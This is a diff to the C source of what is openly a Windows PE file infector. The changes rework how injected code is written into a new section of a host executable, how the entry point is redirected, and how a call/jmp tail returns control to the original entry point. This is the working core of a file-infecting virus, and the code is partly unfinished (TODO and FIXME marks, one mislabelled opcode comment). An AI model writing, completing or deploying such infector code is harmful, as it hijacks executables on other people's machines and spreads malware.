@@ -7,11 +7,12 @@
 #include "pe.h"
 #include "infect.h"
 
-#define INJECTION_TAIL_SIZE 6
+#define INJECTION_TAIL_SIZE 10
 #define FILLED_INJECTION_SIZE 0x1000
 
 u8 injection_tail[INJECTION_TAIL_SIZE] = {
-    '\xe9', '\x00', '\x00', '\x00', '\x00', '\x00' // jmp rel32
+    '\xe8', '\x00', '\x00', '\x00', '\x00',  // call near rel16
+    '\xe9', '\x00', '\x00', '\x00', '\x00' // jmp rel32
 };
 u8 filled_injection[FILLED_INJECTION_SIZE];
 u8 * file;
@@ -49,18 +50,31 @@ inline int WriteFileAt(HANDLE file_handle, void* data, u32 size_to_write,u64 poi
 }
 
 void AdjustInjection(u8 injection[]){ // TODO complete this!
-    int address_of_entry_point_new = section_headers[number_of_sections_old - 1].VirtualAddress + section_alignment + off; // FIXME
-    u32 target = address_of_entry_point_old - address_of_entry_point_new - 5;
-    memcpy(filled_injection, injection, INJECTION_SIZE_RAW);
-    memcpy(injection_tail + 1, &target, 4);
-    memcpy(filled_injection + INJECTION_SIZE_RAW, injection_tail, INJECTION_TAIL_SIZE);
+    address_of_entry_point_new = section_headers[number_of_sections_old - 1].VirtualAddress + section_alignment;
+    u32 target = address_of_entry_point_old - address_of_entry_point_new - 5 - 5; // because jmp is the second instruction
+    u32 function = off + 10 - 5;
+    INFO("new target = %d\n", target);
+    INFO("function = 0x%x\n", function);
+    memcpy(injection_tail + 1, &function, 4);
+    memcpy(injection_tail + 6, &target, 4);
+    memcpy(filled_injection, injection_tail, INJECTION_TAIL_SIZE);
+    memcpy(filled_injection + INJECTION_TAIL_SIZE, injection, INJECTION_SIZE_RAW);
+#ifndef NDEBUG
+    for(int i = 0; i < INJECTION_SIZE_RAW + INJECTION_TAIL_SIZE;i ++ ){
+        printf("%02x ", filled_injection[i]);
+        if(i % 32 == 31){
+            printf("\n");
+        }
+    }
+    printf("\n");
+#endif
 }
 
 void infect(u8 injection[], HANDLE file_handle){
-    address_of_entry_point_new = section_headers[number_of_sections_old - 1].VirtualAddress + section_alignment; // FIXME
+    INFO("new entry rva = %x", address_of_entry_point_new);
     int injection_size = INJECTION_SIZE_RAW + INJECTION_TAIL_SIZE;
     u32 virtual_size = injection_size;
-    u32 virtual_address = address_of_entry_point_new;
+    u32 virtual_address = section_headers[number_of_sections_old - 1].VirtualAddress + section_alignment;
     int file_alignment_num;
     file_alignment_num = injection_size / file_alignment;
     if(injection_size % file_alignment > 0){
